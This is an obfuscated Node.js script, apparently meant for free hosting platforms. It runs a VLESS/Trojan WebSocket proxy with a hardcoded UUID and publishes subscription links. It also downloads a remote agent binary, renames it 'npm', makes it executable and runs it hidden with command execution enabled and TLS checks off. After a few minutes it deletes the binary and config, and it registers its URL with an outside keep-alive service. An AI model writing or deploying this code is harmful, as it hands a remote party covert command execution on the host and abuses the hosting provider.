const _0x3144c7=_0x2421;(function(_0x10c40c,_0x3a22cb){const _0x109db4=_0x2421,_0x43c4f5=_0x10c40c();while(!![]){try{const _0x4ccffd=-parseInt(_0x109db4(0x14a))/0x1+-parseInt(_0x109db4(0x167))/0x2*(-parseInt(_0x109db4(0x17e))/0x3)+-parseInt(_0x109db4(0x154))/0x4+parseInt(_0x109db4(0x118))/0x5*(-parseInt(_0x109db4(0x143))/0x6)+parseInt(_0x109db4(0x192))/0x7+parseInt(_0x109db4(0x14e))/0x8+-parseInt(_0x109db4(0x173))/0x9;if(_0x4ccffd===_0x3a22cb)break;else _0x43c4f5['push'](_0x43c4f5['shift']());}catch(_0x48fa50){_0x43c4f5['push'](_0x43c4f5['shift']());}}}(_0x26d4,0x808a8));const os=require('os'),http=require(_0x3144c7(0x147)),fs=require('fs'),axios=require(_0x3144c7(0x11c)),net=require(_0x3144c7(0x18c)),path=require(_0x3144c7(0x165)),crypto=require(_0x3144c7(0x162)),{Buffer}=require(_0x3144c7(0x157)),{exec,execSync}=require(_0x3144c7(0x172)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3144c7(0x137)]['UUID']||'17687fd0-5bce-4604-8b25-214ab080ad9a',NEZHA_SERVER=process[_0x3144c7(0x137)][_0x3144c7(0x13b)]||'',NEZHA_PORT=process[_0x3144c7(0x137)][_0x3144c7(0x190)]||'',NEZHA_KEY=process['env'][_0x3144c7(0x121)]||'',DOMAIN=process['env'][_0x3144c7(0x129)]||_0x3144c7(0x11e),AUTO_ACCESS=process['env'][_0x3144c7(0x156)]||![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x3144c7(0x137)][_0x3144c7(0x133)]||_0x3144c7(0x128),NAME=process['env'][_0x3144c7(0x13c)]||'',PORT=process[_0x3144c7(0x137)][_0x3144c7(0x117)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x4e8c1d=_0x3144c7;try{const _0x5e94d8=await axios['get'](_0x4e8c1d(0x16c)),_0xa94a12=_0x5e94d8[_0x4e8c1d(0x182)];ISP=(_0xa94a12[_0x4e8c1d(0x149)]+'-'+_0xa94a12[_0x4e8c1d(0x16b)])[_0x4e8c1d(0x11f)](/ /g,'_');}catch(_0x18601f){ISP='Unknown';}};GetISP();const httpServer=http[_0x3144c7(0x161)]((_0x2a25f7,_0x4fbec7)=>{const _0x28d722=_0x3144c7;if(_0x2a25f7[_0x28d722(0x11d)]==='/'){const _0x27cef6=path['join'](__dirname,_0x28d722(0x127));fs[_0x28d722(0x15d)](_0x27cef6,_0x28d722(0x17f),(_0x332dff,_0x35a575)=>{const _0x13fc75=_0x28d722;if(_0x332dff){_0x4fbec7[_0x13fc75(0x145)](0xc8,{'Content-Type':_0x13fc75(0x186)}),_0x4fbec7[_0x13fc75(0x17b)]('Hello\x20world!');return;}_0x4fbec7[_0x13fc75(0x145)](0xc8,{'Content-Type':'text/html'}),_0x4fbec7['end'](_0x35a575);});return;}else{if(_0x2a25f7[_0x28d722(0x11d)]==='/'+SUB_PATH){const _0x370cfb=NAME?NAME+'-'+ISP:ISP,_0x1ca82d=_0x28d722(0x16d)+UUID+_0x28d722(0x139)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x28d722(0x188)+WSPATH+'#'+_0x370cfb,_0x45cc2a=_0x28d722(0x11b)+UUID+_0x28d722(0x183)+DOMAIN+_0x28d722(0x178)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x370cfb,_0x571691=_0x1ca82d+'\x0a'+_0x45cc2a,_0x229d02=Buffer['from'](_0x571691)[_0x28d722(0x148)]('base64');_0x4fbec7[_0x28d722(0x145)](0xc8,{'Content-Type':'text/plain'}),_0x4fbec7[_0x28d722(0x17b)](_0x229d02+'\x0a');}else _0x4fbec7[_0x28d722(0x145)](0x194,{'Content-Type':_0x28d722(0x166)}),_0x4fbec7[_0x28d722(0x17b)](_0x28d722(0x159));}}),wss=new WebSocket[(_0x3144c7(0x130))]({'server':httpServer}),uuid=UUID[_0x3144c7(0x11f)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x50e451){return new Promise((_0xa7e763,_0x2ce13d)=>{const _0x67521=_0x2421;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x67521(0x131)](_0x50e451)){_0xa7e763(_0x50e451);return;}let _0x548464=0x0;function _0x4e9de9(){const _0x252300=_0x67521;if(_0x548464>=DNS_SERVERS[_0x252300(0x181)]){_0x2ce13d(new Error(_0x252300(0x122)+_0x50e451+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x30dca4=DNS_SERVERS[_0x548464];_0x548464++;const _0x28cb5a=_0x252300(0x175)+encodeURIComponent(_0x50e451)+_0x252300(0x187);axios[_0x252300(0x146)](_0x28cb5a,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x252300(0x171)](_0xf10165=>{const _0x44e972=_0x252300,_0x2f028b=_0xf10165[_0x44e972(0x182)];if(_0x2f028b[_0x44e972(0x18a)]===0x0&&_0x2f028b[_0x44e972(0x170)]&&_0x2f028b['Answer'][_0x44e972(0x181)]>0x0){const _0x196289=_0x2f028b['Answer'][_0x44e972(0x12e)](_0xbfcdcb=>_0xbfcdcb[_0x44e972(0x164)]===0x1);if(_0x196289){_0xa7e763(_0x196289[_0x44e972(0x182)]);return;}}_0x4e9de9();})[_0x252300(0x150)](_0x41f386=>{_0x4e9de9();});}_0x4e9de9();});}function handleVlessConnection(_0xf616f5,_0x2b045a){const _0xfaccf7=_0x3144c7,[_0x4a0b14]=_0x2b045a,_0x4bd3a1=_0x2b045a[_0xfaccf7(0x135)](0x1,0x11);if(!_0x4bd3a1[_0xfaccf7(0x185)]((_0x256b98,_0x5385d7)=>_0x256b98==parseInt(uuid['substr'](_0x5385d7*0x2,0x2),0x10)))return![];let _0x1eb8be=_0x2b045a[_0xfaccf7(0x135)](0x11,0x12)[_0xfaccf7(0x18e)]()+0x13;const _0x10ef24=_0x2b045a[_0xfaccf7(0x135)](_0x1eb8be,_0x1eb8be+=0x2)[_0xfaccf7(0x193)](0x0),_0x44b787=_0x2b045a['slice'](_0x1eb8be,_0x1eb8be+=0x1)[_0xfaccf7(0x18e)](),_0x3fb04c=_0x44b787==0x1?_0x2b045a[_0xfaccf7(0x135)](_0x1eb8be,_0x1eb8be+=0x4)[_0xfaccf7(0x140)]('.'):_0x44b787==0x2?new TextDecoder()[_0xfaccf7(0x168)](_0x2b045a[_0xfaccf7(0x135)](_0x1eb8be+0x1,_0x1eb8be+=0x1+_0x2b045a[_0xfaccf7(0x135)](_0x1eb8be,_0x1eb8be+0x1)[_0xfaccf7(0x18e)]())):_0x44b787==0x3?_0x2b045a['slice'](_0x1eb8be,_0x1eb8be+=0x10)[_0xfaccf7(0x15f)]((_0x498d56,_0x5aeb57,_0x78a4d7,_0x378275)=>_0x78a4d7%0x2?_0x498d56[_0xfaccf7(0x179)](_0x378275[_0xfaccf7(0x135)](_0x78a4d7-0x1,_0x78a4d7+0x1)):_0x498d56,[])[_0xfaccf7(0x12d)](_0x55e296=>_0x55e296[_0xfaccf7(0x193)](0x0)[_0xfaccf7(0x148)](0x10))[_0xfaccf7(0x140)](':'):'';_0xf616f5[_0xfaccf7(0x12f)](new Uint8Array([_0x4a0b14,0x0]));const _0x1a55c3=createWebSocketStream(_0xf616f5);return resolveHost(_0x3fb04c)[_0xfaccf7(0x171)](_0x1a618b=>{const _0xdcc39a=_0xfaccf7;net[_0xdcc39a(0x16a)]({'host':_0x1a618b,'port':_0x10ef24},function(){const _0x32a448=_0xdcc39a;this[_0x32a448(0x191)](_0x2b045a['slice'](_0x1eb8be)),_0x1a55c3['on']('error',()=>{})[_0x32a448(0x14d)](this)['on']('error',()=>{})[_0x32a448(0x14d)](_0x1a55c3);})['on']('error',()=>{});})['catch'](_0x563701=>{const _0x1eabc2=_0xfaccf7;net[_0x1eabc2(0x16a)]({'host':_0x3fb04c,'port':_0x10ef24},function(){const _0x322477=_0x1eabc2;this[_0x322477(0x191)](_0x2b045a[_0x322477(0x135)](_0x1eb8be)),_0x1a55c3['on'](_0x322477(0x136),()=>{})[_0x322477(0x14d)](this)['on']('error',()=>{})[_0x322477(0x14d)](_0x1a55c3);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x430386,_0x5a11f1){const _0x427c0a=_0x3144c7;try{if(_0x5a11f1['length']<0x3a)return![];const _0x499e80=_0x5a11f1[_0x427c0a(0x135)](0x0,0x38)[_0x427c0a(0x148)](),_0x3bc154=[UUID];let _0x561296=null;for(const _0x5b7206 of _0x3bc154){const _0x4c17a3=crypto['createHash'](_0x427c0a(0x125))[_0x427c0a(0x17d)](_0x5b7206)[_0x427c0a(0x14f)](_0x427c0a(0x13d));if(_0x4c17a3===_0x499e80){_0x561296=_0x5b7206;break;}}if(!_0x561296)return![];let _0x5db353=0x38;_0x5a11f1[_0x5db353]===0xd&&_0x5a11f1[_0x5db353+0x1]===0xa&&(_0x5db353+=0x2);const _0x5ab56c=_0x5a11f1[_0x5db353];if(_0x5ab56c!==0x1)return![];_0x5db353+=0x1;const _0x48a48b=_0x5a11f1[_0x5db353];_0x5db353+=0x1;let _0x285449,_0x238c8f;if(_0x48a48b===0x1)_0x285449=_0x5a11f1[_0x427c0a(0x135)](_0x5db353,_0x5db353+0x4)[_0x427c0a(0x140)]('.'),_0x5db353+=0x4;else{if(_0x48a48b===0x3){const _0x840148=_0x5a11f1[_0x5db353];_0x5db353+=0x1,_0x285449=_0x5a11f1['slice'](_0x5db353,_0x5db353+_0x840148)[_0x427c0a(0x148)](),_0x5db353+=_0x840148;}else{if(_0x48a48b===0x4)_0x285449=_0x5a11f1[_0x427c0a(0x135)](_0x5db353,_0x5db353+0x10)[_0x427c0a(0x15f)]((_0x328c3d,_0x5163fd,_0x4dbd15,_0x317a05)=>_0x4dbd15%0x2?_0x328c3d[_0x427c0a(0x179)](_0x317a05[_0x427c0a(0x135)](_0x4dbd15-0x1,_0x4dbd15+0x1)):_0x328c3d,[])[_0x427c0a(0x12d)](_0x5d6154=>_0x5d6154[_0x427c0a(0x193)](0x0)[_0x427c0a(0x148)](0x10))['join'](':'),_0x5db353+=0x10;else return![];}}_0x238c8f=_0x5a11f1['readUInt16BE'](_0x5db353),_0x5db353+=0x2;_0x5db353<_0x5a11f1[_0x427c0a(0x181)]&&_0x5a11f1[_0x5db353]===0xd&&_0x5a11f1[_0x5db353+0x1]===0xa&&(_0x5db353+=0x2);const _0x494d3a=createWebSocketStream(_0x430386);return resolveHost(_0x285449)['then'](_0xa21b82=>{const _0x5d23a9=_0x427c0a;net[_0x5d23a9(0x16a)]({'host':_0xa21b82,'port':_0x238c8f},function(){const _0x44f715=_0x5d23a9;_0x5db353<_0x5a11f1['length']&&this['write'](_0x5a11f1['slice'](_0x5db353)),_0x494d3a['on'](_0x44f715(0x136),()=>{})['pipe'](this)['on']('error',()=>{})[_0x44f715(0x14d)](_0x494d3a);})['on'](_0x5d23a9(0x136),()=>{});})[_0x427c0a(0x150)](_0x4bb310=>{net['connect']({'host':_0x285449,'port':_0x238c8f},function(){const _0x10f0c0=_0x2421;_0x5db353<_0x5a11f1[_0x10f0c0(0x181)]&&this[_0x10f0c0(0x191)](_0x5a11f1[_0x10f0c0(0x135)](_0x5db353)),_0x494d3a['on']('error',()=>{})['pipe'](this)['on'](_0x10f0c0(0x136),()=>{})[_0x10f0c0(0x14d)](_0x494d3a);})['on']('error',()=>{});}),!![];}catch(_0x266e64){return![];}}function _0x26d4(){const _0x3a5001=['583266gGEiFX','Server\x20is\x20running\x20on\x20port\x20','2083','pipe','4546136RgKAMH','digest','catch','https://amd64.ssss.nyc.mn/agent','https://','8443','2839760xfCgPM','setsid\x20nohup\x20./npm\x20-s\x20','AUTO_ACCESS','buffer','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Not\x20Found\x0a','error:\x20','trim','post','readFile','arch','reduce','chmod\x20+x\x20npm','createServer','crypto','config.yaml','type','path','text/plain','223966eyMwIl','decode','unlink','connect','asOrganization','https://speed.cloudflare.com/meta','vless://','stream','finish','Answer','then','child_process','671481ZZXiKS','arm','https://dns.google/resolve?name=','true','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','&fp=chrome&type=ws&host=','concat','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','end','npm\x20is\x20already\x20running,\x20skip\x20running...','update','27VifAUu','utf8','2096','length','data','@cdns.doon.eu.org:443?security=tls&sni=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','every','text/html','&type=A','&path=%2F','arm64','Status','npm','net','false','readUInt8','https://arm64.ssss.nyc.mn/agent','NEZHA_PORT','write','4174926jJrvxK','readUInt16BE','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2053','PORT','65mMLWER','once','application/json','trojan://','axios','url','textline-sshh.hf.space','replace','includes','NEZHA_KEY','Failed\x20to\x20resolve\x20','443','connection','sha224','npm\x20download\x20successfully','index.html','sub','DOMAIN','substr','close','npm\x20running\x20error:','map','find','send','Server','test','https://arm64.ssss.nyc.mn/v1','SUB_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','slice','error','env','log','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','NAME','hex','npm\x20is\x20running','aarch64','join','utf-8','writeFileSync','128406iIDSgY','pop','writeHead','get','http','toString','country'];_0x26d4=function(){return _0x3a5001;};return _0x26d4();}wss['on'](_0x3144c7(0x124),(_0x4081e1,_0x2466cd)=>{const _0x550e71=_0x3144c7,_0x4ef876=_0x2466cd['url']||'';_0x4081e1[_0x550e71(0x119)]('message',_0x2a5740=>{const _0xee2063=_0x550e71;if(_0x2a5740[_0xee2063(0x181)]>0x11&&_0x2a5740[0x0]===0x0){const _0x4edd58=_0x2a5740[_0xee2063(0x135)](0x1,0x11),_0x5af9ec=_0x4edd58[_0xee2063(0x185)]((_0x5a80ad,_0x38cad1)=>_0x5a80ad==parseInt(uuid[_0xee2063(0x12a)](_0x38cad1*0x2,0x2),0x10));if(_0x5af9ec){!handleVlessConnection(_0x4081e1,_0x2a5740)&&_0x4081e1['close']();return;}}!handleTrojanConnection(_0x4081e1,_0x2a5740)&&_0x4081e1[_0xee2063(0x12b)]();})['on']('error',()=>{});});function _0x2421(_0x2d28e5,_0x51abd1){const _0x26d4cb=_0x26d4();return _0x2421=function(_0x2421e3,_0x46587f){_0x2421e3=_0x2421e3-0x117;let _0x312cd9=_0x26d4cb[_0x2421e3];return _0x312cd9;},_0x2421(_0x2d28e5,_0x51abd1);}const getDownloadUrl=()=>{const _0x2f39df=_0x3144c7,_0x1a332e=os[_0x2f39df(0x15e)]();return _0x1a332e===_0x2f39df(0x174)||_0x1a332e===_0x2f39df(0x189)||_0x1a332e===_0x2f39df(0x13f)?!NEZHA_PORT?_0x2f39df(0x132):_0x2f39df(0x18f):!NEZHA_PORT?_0x2f39df(0x13a):_0x2f39df(0x151);},downloadFile=async()=>{const _0x4a8c2b=_0x3144c7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1ed795=getDownloadUrl(),_0x533a28=await axios({'method':_0x4a8c2b(0x146),'url':_0x1ed795,'responseType':_0x4a8c2b(0x16e)}),_0x30819d=fs['createWriteStream'](_0x4a8c2b(0x18b));return _0x533a28[_0x4a8c2b(0x182)][_0x4a8c2b(0x14d)](_0x30819d),new Promise((_0x4a02cc,_0x430227)=>{const _0x4670a4=_0x4a8c2b;_0x30819d['on'](_0x4670a4(0x16f),()=>{const _0x5106fe=_0x4670a4;console[_0x5106fe(0x138)](_0x5106fe(0x126)),exec(_0x5106fe(0x160),_0x367248=>{if(_0x367248)_0x430227(_0x367248);_0x4a02cc();});}),_0x30819d['on'](_0x4670a4(0x136),_0x430227);});}catch(_0x2c10e7){throw _0x2c10e7;}},runnz=async()=>{const _0x2bf5f9=_0x3144c7;try{const _0xd5b798=execSync(_0x2bf5f9(0x177),{'encoding':_0x2bf5f9(0x141)});if(_0xd5b798[_0x2bf5f9(0x15b)]()!==''){console[_0x2bf5f9(0x138)](_0x2bf5f9(0x17c));return;}}catch(_0x55a36d){}await downloadFile();let _0x373be1='',_0x355b91=[_0x2bf5f9(0x123),_0x2bf5f9(0x153),_0x2bf5f9(0x180),'2087',_0x2bf5f9(0x14c),_0x2bf5f9(0x195)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5d0671=_0x355b91[_0x2bf5f9(0x120)](NEZHA_PORT)?'--tls':'';_0x373be1=_0x2bf5f9(0x155)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5d0671+_0x2bf5f9(0x158);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6cbc2f=NEZHA_SERVER[_0x2bf5f9(0x120)](':')?NEZHA_SERVER['split'](':')[_0x2bf5f9(0x144)]():'',_0x58acee=_0x355b91[_0x2bf5f9(0x120)](_0x6cbc2f)?_0x2bf5f9(0x176):_0x2bf5f9(0x18d),_0x24397e='client_secret:\x20'+NEZHA_KEY+_0x2bf5f9(0x184)+NEZHA_SERVER+_0x2bf5f9(0x194)+_0x58acee+_0x2bf5f9(0x134)+UUID;fs[_0x2bf5f9(0x142)]('config.yaml',_0x24397e);}_0x373be1='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x2bf5f9(0x138)](_0x2bf5f9(0x17a));return;}}try{exec(_0x373be1,{'shell':'/bin/bash'},_0x3c849b=>{const _0x202172=_0x2bf5f9;if(_0x3c849b)console[_0x202172(0x136)](_0x202172(0x12c),_0x3c849b);else console[_0x202172(0x138)](_0x202172(0x13e));});}catch(_0x44cd28){console['error'](_0x2bf5f9(0x15a)+_0x44cd28);}};async function addAccessTask(){const _0x2b3112=_0x3144c7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x82b449=_0x2b3112(0x152)+DOMAIN+'/'+SUB_PATH;try{const _0x210bbb=await axios[_0x2b3112(0x15c)]('https://oooo.serv00.net/add-url',{'url':_0x82b449},{'headers':{'Content-Type':_0x2b3112(0x11a)}});console[_0x2b3112(0x138)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5c8494){}}const delFiles=()=>{const _0x149292=_0x3144c7;fs[_0x149292(0x169)](_0x149292(0x18b),()=>{}),fs[_0x149292(0x169)](_0x149292(0x163),()=>{});};httpServer['listen'](PORT,()=>{const _0x2b1864=_0x3144c7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x2b1864(0x14b)+PORT);});
